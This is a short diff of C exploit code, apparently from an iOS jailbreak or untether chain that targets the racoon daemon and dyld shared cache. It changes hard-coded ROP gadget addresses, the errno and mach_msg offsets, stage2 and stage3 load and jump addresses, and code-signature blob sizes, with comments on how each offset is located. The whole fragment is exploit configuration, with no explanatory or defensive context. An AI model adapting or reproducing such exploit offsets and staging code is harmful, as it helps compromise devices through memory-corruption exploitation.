@@ -41,7 +41,8 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.rop_nop = 0x180b12728; // just use the longjmp gadget above and search the ret instruction
 	myoffsets.new_cache_addr = 0x1c0000000; 
 	myoffsets.cache_text_seg_size = 0x30000000; // we can get that by parsing the segements from the cache
-	myoffsets.errno_offset = 0x1b2d65ff8; // we can get that by getting a raw syscall (for example __mmap, then searching for a branch following that and then searching for an adrp and a str)
+	myoffsets.errno_offset = 0x1f2d65000; // we can get that by getting a raw syscall (for example __mmap, then searching for a branch following that and then searching for an adrp and a str)
+	myoffsets.mach_msg_offset = 0x1f1535018;
 	myoffsets.stage2_base = myoffsets.new_cache_addr+myoffsets.cache_text_seg_size+0x4000;
 	myoffsets.stage2_max_size = 0x200000;
 	myoffsets.thread_max_size = 0x10000;
@@ -56,7 +57,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.stage3_fileoffset = 0;
 	myoffsets.stage3_loadaddr = myoffsets.new_cache_addr-0x100000;
 	myoffsets.stage3_size = 0x10000; // get the file size and round at page boundry
-	myoffsets.stage3_jumpaddr = myoffsets.stage3_loadaddr + 0x59fc; // nm of the function we want to jump to
+	myoffsets.stage3_jumpaddr = myoffsets.stage3_loadaddr + 0x65c0; // nm of the function we want to jump to
 	myoffsets.stage3_CS_blob = 49744; // jtool --sig shows that info and I think we can get it when parsing the header
 	myoffsets.stage3_CS_blob_size = 624; // same for this one
 
